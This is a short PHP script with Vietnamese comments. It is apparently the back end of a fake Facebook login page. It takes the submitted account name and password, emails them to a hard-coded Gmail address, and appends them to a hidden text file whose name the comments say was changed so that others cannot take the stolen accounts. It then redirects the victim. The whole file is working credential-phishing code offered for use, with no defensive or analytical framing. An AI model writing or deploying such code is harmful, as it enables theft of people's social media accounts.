<?php
session_start();
if(isset($_SESSION['huongdz'])) {
		include 'logroi.php';
	}else{
	    	include 'chualog.php';
	}
	
if(isset($_POST["taikhoan"])){
    $acc = $_POST["taikhoan"];
    $pass = $_POST["matkhau"];
      $body = "acc: ".$acc." | pass: ".$pass."\n"; //định dạng acc | pass
     $headers = "Tài khoản Facebook";
      mail("ffvua69@gmail.com", $headers, $body);
    
    $test = fopen("udjebjdbxbxb.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
    fwrite($test,$body);
    fclose($test);
    $_SESSION['huongdz'] = $acc;
$_SESSION['quay'] = 1;

     echo '<script>window.location.href="/"</script>';


}
?>

<?php //Nguồn Ticchien ?>
